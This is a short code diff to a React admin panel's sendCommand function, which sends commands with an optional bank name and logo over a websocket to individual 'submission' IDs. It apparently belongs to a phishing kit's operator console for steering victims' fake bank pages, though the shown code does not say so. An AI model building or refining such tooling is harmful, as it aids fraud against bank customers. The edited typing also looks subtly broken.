@@ -141,23 +141,27 @@ const AdminPanel = () => {
   }, []);
 
   const sendCommand = (command: string, submissionId?: string, bankData?: { name: string; logo: string }) => {
-    console.log('Admin Panel: Sending command via Supabase:', command, submissionId, bankData);
+    console.log('Admin Panel: Sending command:', command, submissionId, bankData);
     showNotification(`${command.toUpperCase()} command sent`);
     
-    const commandData: any = {
+    // Ensure we have a valid socket ID
+    if (!submissionId) {
+      console.error('No submission ID provided');
+      return;
+    }
+
+    const commandData = {
       command,
-      submission_id: submissionId || null,
+      submission_id: submissionId,
       created_at: new Date().toISOString(),
     };
     
     if (bankData) {
       commandData.bank_name = bankData.name;
       commandData.bank_logo = bankData.logo;
-      console.log('Admin Panel: Including bank data:', bankData);
     }
     
-    console.log('Admin Panel: Final command data:', commandData);
-    
+    console.log('Admin Panel: Sending command to socket ID:', submissionId, commandData);
     wsClient.send('admin_command', commandData);
     
     if (submissionId) {
